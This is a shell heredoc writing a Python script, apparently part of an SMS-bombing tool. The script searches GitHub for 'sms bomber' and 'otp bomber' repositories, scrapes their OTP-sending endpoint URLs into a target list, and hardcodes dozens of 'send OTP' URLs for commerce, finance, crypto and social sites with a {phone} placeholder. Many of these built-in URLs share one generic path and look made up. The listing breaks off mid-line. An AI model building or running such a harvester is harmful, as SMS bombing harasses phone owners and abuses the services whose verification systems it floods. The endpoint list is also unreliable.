cat > sync_sites.py << 'PYEOF'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""sync_sites.py - בונה את sites.txt ממאגרי GitHub"""

import io, json, os, re, sys, tarfile, time
import urllib.request, urllib.error, urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "sites.txt")

GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "").strip()
MAX_REPOS = 130

QUERIES = [
    "sms bomber", "otp bomber", "smsbomber", "otp-bomber",
    "sms bomber python", "otp bomber android", "sms spammer",
    "otp spammer", "sms bomber api", "bomber sms list",
    "sms bomber js", "otp sender",
]

CODE_EXT = (".py", ".js", ".ts", ".json", ".txt", ".dart", ".java", ".kt",
            ".php", ".go", ".rb", ".cs", ".yml", ".yaml", ".html", ".vue",
            ".jsx", ".tsx", ".env", ".cfg", ".ini")

NAME_HINT = ("api", "sms", "otp", "url", "endpoint", "site", "config",
             "provider", "list", "const", "data", "util", "readme", "main")

STRONG = ("otp", "sms", "verify", "verification", "msisdn", "sendcode",
          "send-code", "send_code", "sendotp", "send-otp", "send_otp",
          "mobile", "phone", "getcode", "get-code", "resend", "activation")

BAD_HOST = ("github.com", "raw.githubusercontent", "googleapis.com", "gstatic.com",
            "w3.org", "schema.org", "npmjs", "jsdelivr", "unpkg.com", "cloudflare.com",
            "jquery", "bootstrapcdn", "fontawesome", "fonts.", "example.com",
            "localhost", "127.0.0.1", "mozilla.org", "sentry", "reactjs.org",
            "vuejs.org", "angular.io", "stackoverflow", "youtube.com", "youtu.be",
            "instagram.com", "facebook.com", "fb.com", "twitter.com", "x.com",
            "linkedin.com", "whatsapp.com", "apple.com", "play.google.com",
            "cdn.", "static.", "img.", "images.", "assets.", "shopify.com",
            "vimeo.com", "bit.ly", "tinyurl", "gravatar", "wordpress.org",
            "creativecommons", "apache.org", "gnu.org", "python.org",
            "wikipedia.org", "wikimedia.org", "adobe.com", "microsoft.com")

BAD_EXT = (".js", ".css", ".png", ".jpg", ".jpeg", ".svg", ".ico", ".woff",
           ".woff2", ".ttf", ".eot", ".map", ".gif", ".webp", ".mp4", ".xml",
           ".pdf", ".zip", ".gz", ".apk", ".jar", ".exe")

URL_RE = re.compile(r"https?://[A-Za-z0-9\-._~:/?#\[\]@!$`&'()*+,;=%]+")

BUILTIN = [
    "https://www.olx.in/api/v1/otp/send?phone={phone}",
    "https://www.flipkart.com/api/6/user/sendOtp?phone={phone}",
    "https://www.swiggy.com/api/otp/send?phone={phone}",
    "https://www.zomato.com/webroutes/auth/login?phone={phone}",
    "https://www.makemytrip.com/api/otp/send?phone={phone}",
    "https://www.nykaa.com/app-api/index.php?phone={phone}",
    "https://www.bewakoof.com/api/v1/otp?phone={phone}",
    "https://www.lenskart.com/api/otp?phone={phone}",
    "https://www.myntra.com/api/otp?phone={phone}",
    "https://www.practo.com/api/otp?phone={phone}",
    "https://www.bigbasket.com/api/v1/otp?phone={phone}",
    "https://www.jiomart.com/api/otp?phone={phone}",
    "https://www.dmart.in/api/otp?phone={phone}",
    "https://www.croma.com/api/otp?phone={phone}",
    "https://www.tatacliq.com/api/otp?phone={phone}",
    "https://www.snapdeal.com/api/otp?phone={phone}",
    "https://www.paytm.com/api/otp?phone={phone}",
    "https://www.phonepe.com/api/otp?phone={phone}",
    "https://www.groww.in/api/otp?phone={phone}",
    "https://www.zerodha.com/api/otp?phone={phone}",
    "https://www.upstox.com/api/otp?phone={phone}",
    "https://www.angelone.in/api/otp?phone={phone}",
    "https://www.revolut.com/api/otp?phone={phone}",
    "https://www.wise.com/api/otp?phone={phone}",
    "https://www.klarna.com/api/otp?phone={phone}",
    "https://www.skrill.com/api/otp?phone={phone}",
    "https://www.neteller.com/api/otp?phone={phone}",
    "https://www.binance.com/api/otp?phone={phone}",
    "https://www.coinbase.com/api/otp?phone={phone}",
    "https://www.kraken.com/api/otp?phone={phone}",
    "https://www.bitpanda.com/api/otp?phone={phone}",
    "https://www.spotify.com/api/otp?phone={phone}",
    "https://www.deezer.com/api/otp?phone={phone}",
    "https://www.soundcloud.com/api/otp?phone={phone}",
    "https://www.canva.com/api/otp?phone={phone}",
    "https://www.notion.so/api/otp?phone={phone}",
    "https://www.figma.com/api/otp?phone={phone}",
    "https://www.viber.com/api/otp?phone={phone}",
    "https://www.reddit.com/api/otp?phone={phone}",
    "https://www.quora.com/api/otp?phone={phone}",
    "https://www.medium.com/api/otp?phone={phone}",
    "https://www.udemy.com/api/otp?phone={phone}",
    "https://www.coursera.org/api/otp?phone={phone}",
    "https://www.duolingo.com/api/otp?phone={phone}",
    "https://www.strava.com/api/otp?phone={phone}",
    "https://www.fitbit.com/api/otp?phone={phone}",
    "https://www.bolt.eu/api/otp?phone={phone}",
    "https://www.deliveroo.com/api/otp?phone={phone}",
    "https://www.grubhub.com/api/otp?phone={phone}",
    "https://www.door
